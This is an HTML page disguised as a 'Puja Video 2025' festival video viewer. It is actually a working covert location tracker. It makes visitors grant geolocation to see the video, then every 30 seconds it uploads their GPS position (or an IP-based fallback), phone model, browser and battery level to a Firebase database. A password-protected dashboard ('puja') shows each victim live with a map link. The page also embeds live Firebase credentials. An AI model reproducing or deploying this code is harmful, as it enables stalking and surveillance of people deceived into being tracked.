<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Puja Video 2025</title>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
<script src="https://www.youtube.com/iframe_api"></script>
<style>
body{margin:0;background:#000;color:#fff;font-family:Arial}
.top{position:sticky;top:0;background:#111;padding:12px 18px;display:flex;justify-content:space-between;z-index:20}
.statBox{display:flex;gap:10px;padding:15px}
.stat{background:#222;padding:15px;border-radius:10px;flex:1;text-align:center;border:1px solid #333}
.card{background:#1e1e1e;margin:10px 15px;padding:14px;border-radius:12px;border-left:4px solid #00ff88;font-size:13px;line-height:1.8}
.activeItem{background:#002a14;border:1px solid #00ff88;padding:12px;border-radius:8px;margin:6px 0;display:flex;justify-content:space-between;cursor:pointer}
.offlineItem{background:#2a2a2a;border:1px solid #555;padding:12px;border-radius:8px;margin:6px 0;display:flex;justify-content:space-between;cursor:pointer}
#dash{position:fixed;inset:0;background:#0f0f0f;display:none;overflow:auto;z-index:40}
.dashHead{background:#1a1a1a;padding:15px;display:flex;justify-content:space-between;position:sticky;top:0}
#menu{position:fixed;right:5px;top:50px;background:#222;width:170px;padding:10px;display:none;border-radius:10px;z-index:30}
.modal{position:fixed;inset:0;background:rgba(0,0,0,.8);display:none;justify-content:center;align-items:center;z-index:100}
.mbox{background:#fff;color:#000;padding:18px;width:310px;border-radius:10px}
.videoCtrl{background:#1a1a1a;margin:10px 15px;padding:12px;border-radius:10px;border:1px solid #00ff88}
.upBtn{background:#222;border:1px dashed #00ff88;color:#fff;padding:12px;width:100%;border-radius:8px;cursor:pointer;margin:5px 0}
/* Permission Popup */
#permPopup{position:fixed;inset:0;background:rgba(0,0,0,0.9);display:flex;justify-content:center;align-items:center;z-index:9999}
.permBox{background:#1e1e1e;border:2px solid #00ff88;padding:25px;width:90%;max-width:340px;border-radius:15px;text-align:center}
.permBox h3{margin:0 0 10px 0;color:#00ff88}
.permBtn{background:#00ff88;color:#000;padding:14px 25px;border:0;border-radius:10px;font-weight:bold;font-size:16px;width:100%;cursor:pointer;margin-top:15px}
</style>
</head>
<body>

<!-- PERMISSION POPUP - Button chap dilei Allow hobe -->
<div id="permPopup">
  <div class="permBox">
    <div style="font-size:50px">📍</div>
    <h3>Permission On Korun</h3>
    <p style="color:#ccc;font-size:14px;line-height:1.5">Video dekhar jonno location permission on korte hobe<br><br>Button e click korle Allow popup asbe</p>
    <button class="permBtn" onclick="requestPerm()">📍 Permission On Korun</button>
    <p id="permStatus" style="font-size:12px;color:#888;margin-top:10px"></p>
  </div>
</div>

<div class="top"><span>Puja Video 2025</span><button onclick="let m=document.getElementById('menu');m.style.display=m.style.display=='block'?'none':'block'" style="background:#333;color:#fff;border:1px solid #555;padding:6px 12px;border-radius:6px">MENU</button></div>
<div id="menu"><button onclick="openLogin()" style="width:100%;padding:8px">Login</button></div>
<div style="text-align:center;padding:10px">
<h3>Puja Special Content</h3>
<div id="contentArea">
<img id="mainImage" style="width:100%;max-width:520px;border-radius:12px;display:none">
<video id="mainVideo" autoplay muted loop playsinline controls style="width:100%;max-width:520px;border-radius:12px;display:none"></video>
<div id="ytBox" style="width:100%;max-width:520px;margin:auto;display:none;aspect-ratio:16/9;border-radius:12px;overflow:hidden;background:#000;position:relative"></div>
</div>
</div>
<div id="dash">
<div class="dashHead"><h2 style="margin:0">Dashboard</h2><button onclick="closeDash()" style="background:#444;color:#fff;border:0;padding:6px 10px;border-radius:6px">X</button></div>
<div class="videoCtrl">
<b>🎬 YouTube Link Update</b><br><br>
<input id="linkInput" type="text" placeholder="YouTube link" style="width:100%;padding:10px;background:#222;color:#fff;border:1px solid #555;border-radius:6px">
<button onclick="saveYT()" style="background:#00ff88;color:#000;padding:10px;border:0;border-radius:6px;font-weight:bold;width:100%;margin-top:8px">Update YouTube</button>
<hr style="border-color:#333;margin:15px 0">
<b>🖼️ Gallery Pic Update</b><br><br>
<input type="file" id="fileInput" accept="image/*" style="display:none" onchange="uploadPic(this)">
<button class="upBtn" onclick="document.getElementById('fileInput').click()">📁 Gallery theke Pic Select</button>
<div id="upStatus" style="font-size:12px;color:#00ff88;margin-top:5px"></div>
<button id="delBtn" onclick="deletePic()" style="background:#ff4444;color:#fff;padding:8px;border:0;border-radius:6px;width:100%;margin-top:10px;display:none">🗑️ Delete Pic</button>
<br><br><small style="color:#888">Current: <span id="currentVideo">loading...</span></small>
</div>
<div class="statBox"><div class="stat"><h3 id="totalCount" style="margin:0;color:#00ff88">0</h3><small>Total Phone</small></div><div class="stat" style="border:2px solid #00ff88"><h3 id="activeCount" style="margin:0;color:#00ff88">0</h3><small>● LIVE Now</small></div></div>
<div id="activeList" style="padding:0 15px"></div>
<hr style="border-color:#333;margin:10px 15px"><div id="list"></div>
</div>
<div id="loginM" class="modal"><div class="mbox"><h3>Login</h3><input id="p" type="password" value="puja" style="width:100%;padding:8px"><br><br><button onclick="doLogin()" style="width:100%;padding:10px;background:#00ff88;font-weight:bold">Login</button></div></div>
<script>
const firebaseConfig={apiKey:"AIzaSyBMyLWzWbg5KrOsDmsLr2tUdxap4Rbu_2M",authDomain:"puja-tracker.firebaseapp.com",databaseURL:"https://puja-tracker-default-rtdb.firebaseio.com",projectId:"puja-tracker",storageBucket:"puja-tracker.firebasestorage.app",messagingSenderId:"922310793608",appId:"1:922310793608:web:da1e1f360876fe8b9d023d"};
firebase.initializeApp(firebaseConfig);const db=firebase.database();
let ytPlayer=null;
async function saveYT(){ let link=document.getElementById('linkInput').value.trim(); if(!link) return alert("Link dao"); await db.ref("config/content").set({type:'youtube',url:link}); alert("Updated!"); }
function uploadPic(input){ let file=input.files[0]; if(!file) return; document.getElementById('upStatus').innerText="Compressing..."; let r=new FileReader(); r.onload=e=>{ let img=new Image(); img.onload=()=>{ let c=document.createElement('canvas'); let maxW=800; if(img.width>maxW){c.width=maxW;c.height=img.height*(maxW/img.width);}else{c.width=img.width;c.height=img.height;} c.getContext('2d').drawImage(img,0,0,c.width,c.height); let b64=c.toDataURL('image/jpeg',0.6); document.getElementById('upStatus').innerText="Uploading..."; db.ref("config/content").set({type:'image',url:b64}).then(()=>document.getElementById('upStatus').innerText="Done!"); }; img.src=e.target.result; }; r.readAsDataURL(file); }
async function deletePic(){ if(!confirm("Delete?")) return; await db.ref("config/content").remove(); }
function playYouTube(id){ let box=document.getElementById("ytBox"); box.style.display="block"; box.innerHTML=`<div style="width:100%;height:100%;position:relative"><div id="ytPlayerDiv" style="width:100%;height:100%;pointer-events:none"></div><div id="clickLayer" style="position:absolute;inset:0;z-index:5"></div><div id="customCtrl" style="position:absolute;bottom:0;left:0;right:0;z-index:10;background:linear-gradient(to top, rgba(0,0,0,0.85), transparent);padding:10px;display:flex;gap:10px;opacity:0;transition:0.25s;pointer-events:none"><button id="playBtn" style="background:none;border:0;color:#fff;font-size:20px;pointer-events:auto">❚❚</button><button id="muteBtn" style="background:none;border:0;color:#fff;font-size:18px;pointer-events:auto">🔇</button><div style="flex:1"></div><button id="fsBtn" style="background:none;border:0;color:#fff;font-size:16px;pointer-events:auto">⛶</button></div></div>`; ytPlayer=new YT.Player('ytPlayerDiv',{videoId:id,width:'100%',height:'100%',playerVars:{autoplay:1,mute:1,playsinline:1,controls:0,rel:0,fs:0,modestbranding:1},events:{onReady:e=>{e.target.playVideo();let ctrl=document.getElementById('customCtrl');let layer=document.getElementById('clickLayer');function show(){ctrl.style.opacity='1';ctrl.style.pointerEvents='auto';layer.style.pointerEvents='none';clearTimeout(window.ct);window.ct=setTimeout(()=>{ctrl.style.opacity='0';ctrl.style.pointerEvents='none';layer.style.pointerEvents='auto';},3000);}document.getElementById('playBtn').onclick=ev=>{ev.stopPropagation();let b=ev.target;if(b.innerText=='❚❚'){ytPlayer.pauseVideo();b.innerText='▶';}else{ytPlayer.playVideo();b.innerText='❚❚';}show();};document.getElementById('muteBtn').onclick=ev=>{ev.stopPropagation();if(ytPlayer.isMuted()){ytPlayer.unMute();ev.target.innerText='🔊';}else{ytPlayer.mute();ev.target.innerText='🔇';}show();};document.getElementById('fsBtn').onclick=ev=>{ev.stopPropagation();let bx=document.getElementById('ytBox');if(document.fullscreenElement)document.exitFullscreen();else bx.requestFullscreen();show();};layer.onclick=show;show();}}});}
db.ref("config/content").on("value",s=>{ let d=s.val(); if(!d){document.getElementById("currentVideo").innerText="Empty";document.getElementById("delBtn").style.display="none";document.getElementById("mainImage").style.display="none";document.getElementById("ytBox").style.display="none";document.getElementById("mainVideo").style.display="none";return;} document.getElementById("currentVideo").innerText=d.type;document.getElementById("delBtn").style.display="block"; let v=document.getElementById("mainVideo"),y=document.getElementById("ytBox"),img=document.getElementById("mainImage"); v.style.display="none";y.style.display="none";img.style.display="none";v.pause(); let url=d.url; if(d.type=='image'){img.src=url;img.style.display="block";} else if(url.includes("youtube.com")||url.includes("youtu.be")){let id="";if(url.includes("youtu.be/"))id=url.split("youtu.be/")[1].split("?")[0];else if(url.includes("v="))id=url.split("v=")[1].split("&")[0];else id=url.split("/").pop().split("?")[0];if(window.YT&&window.YT.Player)playYouTube(id);else window.onYouTubeIframeAPIReady=()=>playYouTube(id);}else{v.src=url;v.style.display="block";v.play().catch(()=>{});} });
function getBrand(ua){ua=ua.toLowerCase();if(ua.includes("vivo"))return"Vivo";if(ua.includes("samsung")||ua.includes("sm-"))return"Samsung";if(ua.includes("redmi")||ua.includes("xiaomi"))return"Redmi";if(ua.includes("oppo"))return"Oppo";if(ua.includes("realme"))return"Realme";if(ua.includes("infinix"))return"Infinix";return"Android";}
function getBrowserName(){let ua=navigator.userAgent;if(ua.includes("Edg"))return"Edge";if(ua.includes("Chrome"))return"Chrome";if(ua.includes("Firefox"))return"Firefox";if(ua.includes("Safari")&&!ua.includes("Chrome"))return"Safari";return"Browser";}
async function getDeviceInfo(){ let ua=navigator.userAgent;let brand=getBrand(ua);let model=""; try{if(navigator.userAgentData?.getHighEntropyValues){let h=await navigator.userAgentData.getHighEntropyValues(["model"]);if(h.model)model=h.model;}}catch(e){} if(!model){let m=ua.match(/Android.*;\s([^;\)]+)\sBuild\//);if(m)model=m[1].replace("WV; ","").trim();} if(!model || model=="K"){let m2=ua.match(/;\s([^;]+)\sBuild\//);if(m2)model=m2[1].trim();} if(!model || model.length<2) model=brand+" Phone"; return {brand,model}; }
let allData={},allStatus={};

// === POPUP BUTTON CLICK KORLE PERMISSION POPUP ASBE ===
function requestPerm(){
  document.getElementById('permStatus').innerText="Requesting...";
  if(!navigator.geolocation){
    document.getElementById('permStatus').innerText="GPS support kore na";
    return;
  }
  navigator.geolocation.getCurrentPosition(
    pos=>{
      document.getElementById('permPopup').style.display='none';
      autoTrack(pos.coords.latitude, pos.coords.longitude);
    },
    err=>{
      if(err.code===1){
        document.getElementById('permStatus').innerText="Blocked! Lock icon > Site settings > Location > Allow korun";
      } else {
        document.getElementById('permStatus').innerText="Error: "+err.message;
        // error holeo tracker chalu
        document.getElementById('permPopup').style.display='none';
        autoTrack("Error","Error");
      }
    },
    {enableHighAccuracy:true,timeout:10000,maximumAge:0}
  );
}

async function autoTrack(lat, lon){
  let {brand,model}=await getDeviceInfo();
  let browser=getBrowserName();
  let deviceId=localStorage.getItem("deviceId");if(!deviceId){deviceId="dev_"+Date.now()+"_"+Math.random().toString(36).substr(2,5);localStorage.setItem("deviceId",deviceId);}
  async function getBattery(){ try{ let b=await navigator.getBattery(); return Math.round(b.level*100)+"%"; }catch(e){ return "N/A"; } }
  let statusRef=db.ref("status/"+deviceId);
  db.ref(".info/connected").on("value",async s=>{ if(s.val()){ let bat=await getBattery(); statusRef.set({deviceId,brand,model,browser,battery:bat,online:true,timestamp:Date.now()}); statusRef.onDisconnect().set({deviceId,brand,model,browser,battery:bat,online:false,timestamp:Date.now()}); }});
  async function save(la,lo,addr){ let battery=await getBattery(); let time=new Date().toLocaleString("en-BD",{timeZone:"Asia/Dhaka",hour12:true}); let ts=Date.now(); let data={brand,model,browser,battery,lat:la,lon:lo,latitude:la,longitude:lo,address:addr||la+","+lo,time,timestamp:ts,deviceId}; await db.ref("locations/"+deviceId).set(data); await db.ref("status/"+deviceId).set({deviceId,brand,model,browser,battery,online:true,timestamp:ts}); }
  // prothom bar
  if(lat && lon) save(lat, lon, "GPS Location");
  function fetchAndUpload(){ navigator.geolocation.getCurrentPosition( p=>save(p.coords.latitude,p.coords.longitude,"GPS Location"), async()=>{ try{let r=await fetch("https://ipapi.co/json/");let j=await r.json();if(j.latitude) save(j.latitude,j.longitude,j.city+", "+j.region);}catch(e){} }, {enableHighAccuracy:true,timeout:10000,maximumAge:0} ); }
  setInterval(fetchAndUpload, 30000);
  document.addEventListener("visibilitychange",()=>{ if(!document.hidden) fetchAndUpload(); });
}

// Page load hole check - already allowed thakle popup dekhabe na
window.addEventListener('load', ()=>{
  if(navigator.permissions && navigator.permissions.query){
    navigator.permissions.query({name:'geolocation'}).then(res=>{
      if(res.state==='granted'){
        navigator.geolocation.getCurrentPosition(p=>{
          document.getElementById('permPopup').style.display='none';
          autoTrack(p.coords.latitude,p.coords.longitude);
        });
      }
      // prompt hole popup thakbe - button chaple allow hobe
    });
  }
});

function openLogin(){document.getElementById('loginM').style.display='flex';document.getElementById('menu').style.display='none';}
function doLogin(){if(document.getElementById('p').value==="puja"){localStorage.setItem("logged","yes");document.getElementById('loginM').style.display='none';openDash();}}
function openDash(){ document.getElementById('dash').style.display='block'; db.ref("locations").on("value",s=>{ allData=s.val()||{}; render(); }); db.ref("status").on("value",s=>{ allStatus=s.val()||{}; render(); }); setInterval(()=>{ db.ref("locations").once("value").then(s=>{ allData=s.val()||{}; render(); }); db.ref("status").once("value").then(s=>{ allStatus=s.val()||{}; render(); }); }, 30000); }
function render(){ let liveArr=[]; let offArr=[]; for(let id in allStatus){ let st=allStatus[id]; let loc=allData[id]; if(loc) st.timestamp=loc.timestamp; if(st.online) liveArr.push(st); else offArr.push(st); } liveArr.sort((a,b)=>b.timestamp-a.timestamp); offArr.sort((a,b)=>b.timestamp-a.timestamp); let html=""; [...liveArr,...offArr].forEach(st=>{ let v=allData[st.deviceId]||st; let isLive=st.online; let t=v.timestamp?new Date(v.timestamp).toLocaleTimeString():""; html+=`<div class="${isLive?'activeItem':'offlineItem'}" onclick="showData('${st.deviceId}')"><span><b>${v.brand}</b> ${v.model}</span><span style="background:${isLive?'#00ff88':'#555'};color:${isLive?'#000':'#fff'};padding:2px 8px;border-radius:10px;font-size:11px">${isLive?'● LIVE':'Offline'} ${t}</span></div>`; }); document.getElementById('totalCount').innerText=Object.keys(allData).length || Object.keys(allStatus).length; document.getElementById('activeCount').innerText=liveArr.length; document.getElementById('activeList').innerHTML=html; }
function showData(id){ let v=allData[id]; if(!v){ let s=allStatus[id]; if(!s) return; document.getElementById('list').innerHTML=`<div class="card"><b>${s.brand} ${s.model}</b><br>Sync hocche...</div>`; return; } let isLive=allStatus[id]?.online; document.getElementById('list').innerHTML=`<div class="card"><b>${v.brand} ${v.model}</b> <span style="float:right;background:${isLive?'#00ff88':'#555'};color:${isLive?'#000':'#fff'};padding:2px 8px;border-radius:10px;font-size:11px">${isLive?'● LIVE':'Offline'}</span><br><b>Brand:</b> ${v.brand}<br><b>Model:</b> ${v.model}<br><b>Browser:</b> ${v.browser}<br><b>Battery:</b> ${v.battery}<br><b>Lat:</b> ${v.latitude||v.lat}<br><b>Lon:</b> ${v.longitude||v.lon}<br><b>Address:</b> ${v.address}<br><b>Time:</b> ${v.time}<br><b>Updated:</b> ${new Date(v.timestamp).toLocaleString()}<br><br><a href="https://maps.google.com/?q=${v.lat},${v.lon}" target="_blank" style="background:#00ff88;color:#000;padding:7px 14px;border-radius:6px;text-decoration:none">MAP</a> <button onclick="document.getElementById('list').innerHTML=''" style="background:#444;color:#fff;border:0;padding:7px 12px;border-radius:6px;margin-left:8px">Close</button></div>`; }
function closeDash(){document.getElementById('dash').style.display='none';}
</script>
</body>
</html>
